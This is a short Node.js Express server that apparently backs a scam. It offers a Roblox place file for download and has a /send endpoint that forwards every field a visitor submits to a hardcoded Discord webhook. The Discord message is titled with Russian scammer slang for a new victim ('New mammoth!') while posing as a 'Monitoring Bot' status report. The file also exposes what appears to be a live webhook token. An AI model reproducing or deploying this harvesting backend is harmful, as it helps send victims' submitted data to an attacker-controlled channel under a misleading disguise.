const { table } = require('console');
const express = require('express');
const path = require('path');
const app = express();

const PORT = process.env.PORT || 3000;
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

const webhookUrl = 'https://discord.com/api/webhooks/1519693949214658762/MVHMg0w16OS3IkPVwLODMU2myWyAC5VF86n-L74rmxhtyk-w_jITF7yg_qpXUaXNfsG6';

app.get('/download', async (req, res) => {
  const file = path.join(__dirname, 'public', 'sfa.rbxl'); // <=========================================
  res.download(file);
});

app.post('/send', async (req, res) => {
        const reqBody = req.body;
        const fieldsArray = [];
        let index = 0;
        let embed = {
            title: "Новый мамонт!",
            description: "All systems operational",
            color: 5763719, // Green
            fields: [
              
            ],
            footer: {
              text: "Monitoring Bot"
            },
            timestamp: new Date().toISOString()
        };
        console.log(reqBody);
        for (const key in reqBody) {
            if (Object.prototype.hasOwnProperty.call(reqBody, key)) {
                index++;
                //name: "Memory",
                //value: "4.2 GB / 16 GB",
                //inline: true
                embed.fields.push({ name: key, value: reqBody[key], inline: true });
                console.log(reqBody[key],index);
            }
        }
        const response = await fetch(webhookUrl, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({ embeds: [embed] })
        });
        console.log(response);
        // Формируем правильную структуру для Discord
        res.status(200).json({ success: true });
});


app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
